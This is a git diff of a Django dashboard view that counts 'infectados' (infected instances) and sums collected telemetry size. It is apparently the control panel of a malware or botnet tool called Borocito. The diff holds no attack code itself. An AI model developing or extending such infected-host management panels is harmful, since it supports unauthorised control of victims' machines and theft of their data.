@@ -2,6 +2,7 @@ from django.shortcuts import render, redirect
 from django.views.decorators.csrf import csrf_exempt
 from django.http import HttpRequest, HttpResponse
 from django.contrib import messages
+from django.db.models import Sum
 from django.conf import settings
 
 import os
@@ -9,16 +10,24 @@ import os
 # Create your views here.
 from api.models import Instancia, Telemetria
 from configs.models import Configuration, Component
+from web.utilities import convert_size
 
 def dashboard(request: HttpRequest):
     configuration = Configuration.objects.last() # last row is always the active one
     infectados = Instancia.objects.count()
-    return render(request, "web/dashboard.html", {
+    contexto = {
         "infectados": infectados,
         "componentes": Component.objects.count(),
         "configuration": configuration,
         "telemetria": sum([len(files) for r, d, files in os.walk(settings.BOROCITO_TELEMETRY_DIR)]),
-    })
+    }
+    telemetria_tamaño = Telemetria.objects.aggregate(tamaño=Sum('size'))['tamaño']
+    if telemetria_tamaño >= 30_000:
+        contexto.update({"telemetria_tamaño": convert_size(telemetria_tamaño)})
+    borocito_config = Configuration.objects.last()
+    if borocito_config:
+        contexto.update({"borocito_config": borocito_config})
+    return render(request, "web/dashboard.html", contexto)
 
 def user_list(request: HttpRequest):
     infectados = Instancia.objects.all()
